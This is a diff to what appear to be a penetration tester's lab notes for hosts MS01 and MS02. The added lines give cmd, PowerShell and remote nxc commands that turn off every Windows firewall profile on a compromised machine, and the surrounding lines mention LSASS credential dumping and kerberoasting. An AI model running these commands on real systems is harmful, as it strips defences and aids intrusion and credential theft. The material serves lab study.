@@ -125,6 +125,19 @@ nxc smb <target ip> -u <admin user> -p <password> -M lsassy --local-auth
 
 - Enumerate MS01 again as Admin. Comb through the Administrator's folder and then maybe run winpeas for good measure.
 
+- also kill the firewall on MS01 so you dont run into pesky listener issues
+```
+# cmd version
+netsh advfirewall set allprofiles state off
+# powershell version
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+```bash
+# using nxc to issue remote commands
+nxc smb '<IP>' -u '<User>' -p '<Password>' -d '<Domain>'  -X 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
+```
+
+
 ## MS02
 
 5) check for kerberoast and as-rep roast since it is a low hanging fruit
